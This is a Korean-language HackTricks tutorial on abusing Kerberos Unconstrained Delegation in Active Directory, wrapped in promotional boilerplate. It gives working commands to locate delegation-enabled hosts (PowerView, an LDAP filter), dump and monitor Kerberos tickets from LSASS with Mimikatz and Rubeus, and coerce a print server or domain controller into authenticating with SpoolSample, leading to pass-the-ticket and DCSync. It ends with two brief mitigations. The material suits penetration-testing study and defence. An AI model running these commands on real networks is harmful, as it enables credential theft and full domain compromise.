# Unconstrained Delegation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>로부터 <strong>AWS 해킹을 처음부터 전문가까지 배워보세요</strong>!</summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 **HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요. 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## Unconstrained Delegation

도메인 관리자는 도메인 내의 **컴퓨터**에 대해이 기능을 설정할 수 있습니다. 그런 다음 사용자가 컴퓨터에 **로그인** 할 때마다 해당 사용자의 **TGT의 사본이 TGS에 의해 전송**되고 LSASS의 메모리에 저장됩니다. 따라서 해당 컴퓨터에서 관리자 권한을 가지고 있다면 티켓을 덤프하고 어떤 컴퓨터에서든 사용자를 위장할 수 있습니다.

따라서 도메인 관리자가 "Unconstrained Delegation" 기능이 활성화 된 컴퓨터에 로그인하고 해당 컴퓨터에서 로컬 관리자 권한을 가지고 있다면 티켓을 덤프하고 도메인 관리자를 어디에서든 위장할 수 있습니다 (도메인 권한 상승).

이 속성을 가진 컴퓨터 개체를 찾으려면 [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) 속성이 [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)을 포함하는지 확인하면 됩니다. Powerview가 수행하는 것과 동일한 작업을 LDAP 필터 '(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'로 수행할 수 있습니다.

<pre class="language-bash"><code class="lang-bash"># Unconstrained 컴퓨터 목록
## Powerview
Get-NetComputer -Unconstrained #DCs는 항상 표시되지만 권한 상승에는 유용하지 않습니다.
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatz를 사용하여 티켓 내보내기
</strong>privilege::debug
sekurlsa::tickets /export #권장하는 방법
kerberos::list /export #다른 방법

# 로그인 모니터링 및 새로운 티켓 내보내기
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #10초마다 새로운 TGT 확인</code></pre>

**Mimikatz** 또는 **Rubeus**를 사용하여 관리자 (또는 피해자 사용자)의 티켓을 메모리에 로드하고 **티켓 전달**에 대한 자세한 정보는 [여기](pass-the-ticket.md)에서 확인하세요.\
자세한 정보: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team에서 Unconstrained Delegation에 대한 자세한 정보**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **강제 인증**

공격자가 "Unconstrained Delegation"에 허용된 컴퓨터를 **침투**할 수 있다면 **프린트 서버**를 속일 수 있습니다. 이렇게 하면 서버의 메모리에 TGT가 저장되어 자동으로 로그인합니다.\
그런 다음 공격자는 사용자 프린트 서버 컴퓨터 계정을 위장하기 위해 **Pass the Ticket 공격**을 수행할 수 있습니다.

프린트 서버가 어떤 컴퓨터에 대해 로그인하도록하려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있습니다.
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
만약 TGT가 도메인 컨트롤러에서 온 것이라면, [**DCSync 공격**](acl-persistence-abuse/#dcsync)을 수행하여 DC에서 모든 해시를 얻을 수 있습니다.\
[**이 공격에 대한 자세한 정보는 ired.team에서 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**다음은 인증을 강제로 시도하는 다른 방법입니다:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 완화 방법

* DA/Admin 로그인을 특정 서비스로 제한합니다.
* 특권 계정에 대해 "계정이 민감하며 위임할 수 없음"을 설정합니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하고 계신가요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
